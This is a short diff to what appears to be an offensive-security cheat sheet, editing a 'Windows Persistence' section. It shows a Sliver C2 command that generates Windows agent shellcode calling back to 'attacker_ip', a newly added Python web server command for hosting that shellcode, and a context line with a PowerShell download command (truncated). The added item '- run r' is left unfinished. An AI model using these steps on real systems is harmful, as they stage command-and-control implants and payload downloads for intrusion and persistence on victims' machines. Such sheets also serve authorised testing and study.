@@ -1457,10 +1457,13 @@ START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http:
 
 # 24	WINDOWS PERSISTENCE
 ## 24.1	- 
-- Generate Sliver agent shellcode
+- Generate Sliver agent shellcode and host
 ```
 sliver > generate --mtls attacker_ip --save /tmp -f shellcode --os windows
+
+python3 -m http.server 80 --directory /tmp
 ```
+- run r
 
 
 # 25	ATTACK PATH
